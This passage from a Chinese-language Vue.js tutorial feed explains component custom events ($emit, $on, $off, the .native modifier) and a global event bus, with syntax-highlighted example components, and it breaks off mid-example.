</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">subIds</span><span class="p">.</span><span class="nx">updateTodo</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span>
</span></span><span class="line"><span class="cl">                                <span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="s1">&#39;update-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">updateTodo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 取消订阅所有消息
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">subIds</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">subId</span> <span class="p">=&gt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">unsubscribe</span><span class="p">(</span><span class="nx">subId</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">subIds</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 组件自定义事件</title>
      <link>/docs/vue/components/custom-events/</link>
      <pubDate>Tue, 19 Sep 2023 03:10:26 +0000</pubDate>
      
      <guid>/docs/vue/components/custom-events/</guid>
      <description><![CDATA[给一个子组件定义自定义事件的步骤大致如下： 在父组件中使用v-on绑定自定义事件，并定义回调。 例如给一个user-info绑定自定义事件： &lt;!-- App.vue]]></description>
      <content:encoded><![CDATA[<p>给一个子组件定义自定义事件的步骤大致如下：</p>
<ul>
<li>
<p>在父组件中使用<code>v-on</code>绑定自定义事件，并定义回调。</p>
<p>例如给一个<code>user-info</code>绑定自定义事件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  App.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      通过父组件给子组件绑定一个自定义事件
</span></span></span><span class="line"><span class="cl"><span class="c">      实现子组件给父组件传递数据
</span></span></span><span class="line"><span class="cl"><span class="c">      使用 .once 修饰符，让事件只在第1次被触发时执行回调
</span></span></span><span class="line"><span class="cl"><span class="c">     --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">user-info</span> <span class="err">@</span><span class="na">get-name</span><span class="err">.</span><span class="na">once</span><span class="o">=</span><span class="s">&#34;getUserName&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">import</span> <span class="nx">UserInfo</span> <span class="nx">from</span> <span class="s1">&#39;./components/user-info.vue&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">UserInfo</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">getUserName</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;The event get-name has be trigged.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>然后在子组件中，触发该自定义事件。</p>
<p>接上例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  user-info.vue
</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;user&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户姓名：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;sendUserName&#34;</span><span class="p">&gt;</span>获取用户姓名<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;user-info&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">age</span><span class="o">:</span> <span class="mi">21</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sendUserName</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 触发 user-info 组件实例上的 get-name 事件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;get-name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h1 id="实现子组件到父组件的数据通信" data-numberify>实现子组件到父组件的数据通信<a class="anchor ms-1" href="#实现子组件到父组件的数据通信"></a></h1>
<p>通过自定义事件，可以实现子组件到父组件的数据通信。</p>
<p>如上例，在子组件<code>user-info</code>中，触发<code>get-user-name</code>事件的方法为<code>this.$emit()</code>（<code>this</code>是组件实例，Vue实例上也有这个方法）。</p>
<p><code>this.$emit()</code>：</p>
<ol>
<li>参数1：触发的事件名称。</li>
<li>参数2 ~ n：触发事件的同时，向父组件传递的数据。</li>
</ol>
<p>子组件通过调用<code>this.$emit()</code>来触发事件，然后告知父组件有数据需要传递。接着通过<code>this.$emit()</code>的第2 ~ n个参数，将数据传递给父组件。</p>
<p>父组件通过事件回调函数来处理事件，并接收从子组件传递过来的数据。</p>
<p>例如某个子组件触发了<code>update</code>事件，并且将数据传递给父组件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;update&#34;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">sex</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">age</span><span class="p">)</span>
</span></span></code></pre></div><p>在父组件的<code>methods</code>中，可以这样定义回调函数：</p>
<ul>
<li>
<p>定义对应的形参：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">updateHandler</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">sex</span><span class="p">,</span> <span class="nx">age</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div></li>
<li>
<p>定义数量可变的形参：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">updateHandler</span><span class="p">(...</span><span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div></li>
</ul>
<p>修改上方的<code>user-info</code>和<code>App</code>组件，从<code>user-info</code>中获取用户的姓名，并在<code>App</code>组件中显示欢迎消息：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  App.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">user-info</span> <span class="err">@</span><span class="na">get-name</span><span class="o">=</span><span class="s">&#34;getUserName&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">import</span> <span class="nx">UserInfo</span> <span class="nx">from</span> <span class="s1">&#39;./components/user-info.vue&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span><span class="nx">UserInfo</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">userName</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sb">`Hello </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">userName</span><span class="si">}</span><span class="sb">!`</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">getUserName</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;The event get-name has be trigged.&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">userName</span> <span class="o">=</span> <span class="nx">name</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">app</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">orange</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  user-info.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- ... --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;SiteUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">immediate</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">handler</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 触发 user-info 组件实例上的 get-name 事件，并传递数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;get-name&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">user</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">skyblue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-top</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="绑定自定义事件" data-numberify>绑定自定义事件<a class="anchor ms-1" href="#绑定自定义事件"></a></h1>
<p>事件有两种绑定方式：</p>
<ul>
<li>
<p>使用<code>v-on</code>指令绑定。</p>
<p>如上所示的案例，都是使用<code>v-on</code>来绑定自定义事件。</p>
</li>
<li>
<p>在父组件中，使用<code>ref</code>属性获取组件实例对象，然后通过在父组件的<code>mounted()</code>钩子中调用组件实例对象的<code>$on</code>方法绑定。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">demo</span> <span class="err">@</span><span class="na">event-name</span><span class="o">=</span><span class="s">&#34;eventHandler&#34;</span><span class="p">/&gt;</span>
</span></span></code></pre></div><p>上方对应的使用<code>ref</code>绑定事件的方法是：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">demo</span> <span class="na">ref</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">/&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">$ref</span><span class="p">.</span><span class="nx">demo</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="s1">&#39;event-name&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">eventHandler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>使用<code>ref</code>加<code>mounted</code>绑定事件的好处是，自定义度高。例如可以在<code>mounted</code>中使用定时器来实现延迟绑定事件的效果。</p>
<blockquote>
<p>注：</p>
<p>在Vue实例对象或组件实例对象上，要让绑定事件仅触发一次，可以使用<code>this.$once()</code>。<code>this.$once()</code>的参数与<code>this.$on()</code>一致。</p>
<p>在<code>mounted</code>中，如果要在绑定事件的同时定义回调函数，应该使用Lambda表达式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">$ref</span><span class="p">.</span><span class="nx">demo</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="s1">&#39;event-name&#39;</span><span class="p">,</span> <span class="p">(...</span><span class="nx">params</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这是因为，如果使用一般的<code>function</code>来定义，那么回调函数中的<code>this</code>指向的是<code>demo</code>的组件实例对象；而使用Lambda来定义，回调函数中的<code>this</code>指向的就是当前的组件实例对象。</p>
<p>如果<code>this.$ref.demo.$on()</code>传入的回调函数是<code>methods</code>中定义的函数，那么这个函数需要使用<code>function</code>来定义。</p>
<p>也就是说，在绑定自定义事件回调时，回调函数要么是配置在<code>methods</code>中用<code>function</code>定义，要么用Lambda表达式定义。</p>
<p>如果子组件的<code>this.$emit()</code>是在<code>immediate:true</code>的<code>watch</code>中调用的，那么就不要使用<code>ref</code>来绑定。因为<code>immediate:true</code>的<code>watch</code>是在<code>beforeCreate()</code>之后<code>created()</code>进行第1次执行。</p>
</blockquote>
</li>
</ul>
<hr>
<h1 id="解绑自定义事件" data-numberify>解绑自定义事件<a class="anchor ms-1" href="#解绑自定义事件"></a></h1>
<p>解绑自定义事件使用的是<code>this.$off()</code>方法：</p>
<ul>
<li><code>this.$off(event)</code>：解绑<code>event</code>指定的事件。<code>event</code>是事件的名称，字符串类型。</li>
<li><code>this.$off([event1, event2, ...])</code>：解绑数组中指定的多个事件。<code>event1</code>、<code>event2</code>等均是事件的名称，字符串类型。</li>
<li><code>this.$off()</code>：解绑所有的自定义事件。当<code>this.$off()</code>没有附带任何参数直接调用时，<code>this.$off()</code>会将实例中的所有事件解绑。</li>
</ul>
<p>解绑自定义事件后，无论再调用多少次对应的<code>this.$emit()</code>，事件都不会被触发。除非在父组件中再次绑定这些自定义事件。</p>
<hr>
<h1 id="绑定原生事件" data-numberify>绑定原生事件<a class="anchor ms-1" href="#绑定原生事件"></a></h1>
<p>Vue中，在组件标签上使用<code>v-on</code>指令绑定的事件，对组件来说，绑定的都是自定义事件。即使绑定的事件名称是原生事件的名称，Vue也会将其识别为自定义事件。</p>
<p>如果要在组件上绑定原生事件，可以使用<code>.native</code>修饰符。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">demo</span> <span class="err">@</span><span class="na">click</span><span class="err">.</span><span class="na">native</span><span class="o">=</span><span class="s">&#34;clickDemo&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="全局事件总线" data-numberify>全局事件总线<a class="anchor ms-1" href="#全局事件总线"></a></h1>
<p>全局事件总线（Global Event Bus）是一种组件间通信的方式，适用于任意组件间通信。</p>
<p>全局事件总线是指，抽取出一个专门用来绑定和触发自定义事件的对象。所有的组件都通过在这个对象上绑定或触发自定义事件来接收或发送数据。</p>
<p>作为全局事件总线，需要满足以下条件：</p>
<ul>
<li>
<p>能被所有组件访问。</p>
<p>可以将全局事件总线对象在Vue原型对象上，让所有组件都能访问。</p>
</li>
<li>
<p>拥有<code>$on</code>、<code>$emit</code>和<code>$off</code>等方法。</p>
<p>可以使用Vue实例或组件实例作为全局事件总线。</p>
</li>
</ul>
<blockquote>
<p>全局事件总线最适用于同级组件间的通信和跨越多层级的组件间的通行。</p>
</blockquote>
<h2 id="安装全局事件总线" data-numberify>安装全局事件总线<a class="anchor ms-1" href="#安装全局事件总线"></a></h2>
<p>一般情况下，是将<code>main.js</code>中的Vue实例对象作为全局事件总线对象，并且将Vue实例安装在Vue原型对象<code>Vue.prototype</code>上。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$bus</span> <span class="o">=</span> <span class="k">this</span> <span class="c1">// 安装全局事件总线
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p><code>$bus</code>只有在Vue实例创建之前进行安装，才能生效。如果在<code>new Vue()</code>执行结束之后安装，是无法生效的（即<code>$bus === undefined</code>）。</p>
<h2 id="使用事件总线发送数据" data-numberify>使用事件总线发送数据<a class="anchor ms-1" href="#使用事件总线发送数据"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">eventHandler</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p><code>this</code>指的是Vue组件实例（下同）。</p>
</blockquote>
<h2 id="使用事件总线接收数据" data-numberify>使用事件总线接收数据<a class="anchor ms-1" href="#使用事件总线接收数据"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">value1</span><span class="p">[,</span> <span class="nx">value2</span><span class="p">[,</span> <span class="p">...]])</span>
</span></span></code></pre></div><h2 id="关闭数据通道" data-numberify>关闭数据通道<a class="anchor ms-1" href="#关闭数据通道"></a></h2>
<p>在当前组件实例中，如果要在事件总线中关闭某条数据通道（停止某个自定义事件的数据发送和接收），可以使用<code>$bus.$off()</code>解绑某个事件。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="c1">// 关闭单个通道
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$off</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 关闭多个通道
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$off</span><span class="p">([</span><span class="nx">event1</span><span class="p">,</span> <span class="nx">event2</span><span class="p">,</span> <span class="p">...])</span>
</span></span></code></pre></div><blockquote>
<p>关闭数据通道（自定义事件）的同时，需要注意该通道（自定义事件）没有被其它组件或组件实例对象所使用。如果当前组件有多个实例，但是它们有相同的数据通道，最好是不要随便去关闭通道。</p>
</blockquote>
<p>销毁前解绑<code>$bus</code>的自定义事件：</p>
<p>在绑定了<code>$bus</code>自定义事件（调用了<code>$bus.$on()</code>）的组件实例中，最好在<code>beforeDestroy</code>钩子中，将当前组件实例使用到的自定义事件从<code>$bus</code>上解绑。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
